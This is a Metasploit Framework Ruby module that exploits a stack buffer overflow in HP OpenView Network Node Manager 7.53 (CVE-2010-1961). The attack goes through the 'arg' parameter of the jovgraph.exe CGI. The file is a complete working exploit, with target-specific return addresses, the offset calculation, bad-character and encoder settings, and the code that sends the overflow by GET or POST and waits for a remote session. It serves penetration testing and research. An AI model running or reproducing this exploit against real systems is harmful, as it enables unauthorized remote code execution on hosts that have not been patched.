##
# $Id: hp_nnm_ovwebsnmpsrv_ovutil.rb 12096 2011-03-23 15:44:55Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/jovgraph.exe', :pattern => /Hewlett-Packard Development Company/ }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP OpenView Network Node Manager ovwebsnmpsrv.exe ovutil Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
				prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'
				CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.

				This vulnerability is triggerable via either a GET or POST request. It is interesting to
				note that this vulnerability cannot be exploited by overwriting SEH, since attempting
				to would trigger CVE-2010-1964.

				The vulnerable code is within a sub-function called from "main" within "ovwebsnmpsrv.exe"
				with a timestamp prior to April 7th, 2010. This function contains a 256 byte stack buffer
				which is passed to the "getProxiedStorageAddress" function within ovutil.dll. When
				processing the address results in an error, the buffer is overflowed in a call to sprintf_new.
				There are no stack cookies present, so exploitation is easily achieved by overwriting the
				saved return address.

				There exists some unreliability when running this exploit. It is not completely clear why
				at this time, but may be related to OVWDB or session management. Also, on some attempts
				OV NNM may report invalid characters in the URL. It is not clear what is causing this
				either.
			} ,
			'Author'         =>
				[
					'jduck'   # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12096 $',
			'References'     =>
				[
					[ 'CVE', '2010-1961' ],
					[ 'OSVDB', '65428' ],
					[ 'BID', '40638' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-106/' ],
					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02217439' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512, # 256 byte buffer..
					# In addition to regular HTTP type bad chars, this one also has
					# an issue with " since the buffer is being passed on the command line.
					'BadChars' => "\x00\x09\x0a\x0b\x0c\x0d\x20\x22\x24\x2c\x3b\x60",
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
					'DisableNops' => true,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'HP OpenView Network Node Manager 7.53 w/NNM_01201',
						{
							'PopPopRet' => 0x5a02aadf, # pop edx/pop ebp/ret - in ov.dll (v1.30.10.9166)
							'JmpEsp' => 0x5a219880,    # jmp esp - in ovsnmp.dll (v1.30.10.9166)
						}
					],
					[ 'HP OpenView Network Node Manager 7.53 (Windows 2003)',
						{
							'PopPopRet' => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959
							'JmpEsp' => 0x5a219880,    # jmp esp - in ovsnmp.dll (v1.30.10.9166)
						}
					],
					[ 'Debug Target',
						{
							'PopPopRet' => 0xdeadbeef, # crasher
							'JmpEsp' => 0xbeefcafe
						}
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'June 16 2010'))

		register_options(
			[
				Opt::RPORT(80),
			], self.class)
	end

	def exploit

		print_status("Trying target #{target.name}...")

		cgi = '/OvCgi/jovgraph.exe'

		# Any command line parameter will cause a buffer overflow.

		# "action" must be set
		action = rand_text_alphanumeric(1)

		# "sel" must be set
		sel = rand_text_alphanumeric(1)

		# "timestamp" cannot be set.

		start = 'No entry for '

		ret_offset = 256 + 4 + 12 + 4

		# Create the buffer
		buf = ''
		buf << rand_text(ret_offset - start.length)
		buf << [target['PopPopRet']].pack('V')
		buf << [0x5a400141].pack('V') # ptr to zero
		buf << [0x5a459fdc].pack('V') # ptr to writable scratch
		buf << [target['JmpEsp']].pack('V')
		#buf << "\xcc"
		buf << payload.encoded

		# Ugh, triggers cve-2010-1964
		#buf = pattern_create(1456)

		# Send the request
		if rand(2) > 0
			print_status("Sending exploit via POST request...")
			res = send_request_cgi({
				'uri'		  => cgi,
				'method'	  => "POST",
				'vars_post' =>
					{
						'sel' => sel,
						'act' => action,
						'arg' => buf
					}
			}, 3)
		else
			print_status("Sending exploit via GET request...")
			res = send_request_cgi({
				'uri'		  => cgi,
				'method'	  => "GET",
				'vars_get' =>
					{
						'sel' => sel,
						'act' => action,
						'arg' => buf
					}
			}, 3)
		end

		if not res
			raise RuntimeError, "Eek! We didn't get a response.. Exploiting this vuln should return one!"
		end

		print_status(res.body) if datastore["NNM_DEBUG"]

		if res.body =~ /graphing applet is being/
			print_status("We got the body we were looking for, the session should be coming any second.")
		else
			raise RuntimeError, "Eek, exploit likely failed. The body didn't contain what we expected."
		end

		handler

	end

	def wfs_delay
		5
	end

end

